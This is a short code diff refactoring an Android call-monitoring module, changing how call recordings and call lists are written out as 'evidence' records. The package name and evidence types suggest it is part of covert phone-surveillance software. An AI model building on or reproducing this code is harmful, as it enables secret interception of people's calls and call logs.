@@ -17,13 +17,13 @@ import android.media.MediaRecorder;
 import android.os.Build;
 
 import com.android.networking.Call;
-import com.android.networking.LogR;
 import com.android.networking.Messages;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.conf.ConfigurationException;
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.evidence.LogR;
 import com.android.networking.evidence.Markup;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
@@ -215,8 +215,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
 			}
 			
-			new LogR(EvidenceType.CALL, additionaldata, data);
-			new LogR(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
+			LogR.atomic(EvidenceType.CALL, additionaldata, data);
+			LogR.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveCallEvidence): not deleting file: " + file);
@@ -323,7 +323,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		addTypedString(databuffer, (byte) 0x04, note);
 		addTypedString(databuffer, (byte) 0x08, number);
 
-		new LogR(EvidenceType.CALLLIST, null, data);
+		LogR.atomic(EvidenceType.CALLLIST, null, data);
 	}
 
 	private boolean isSupported() {
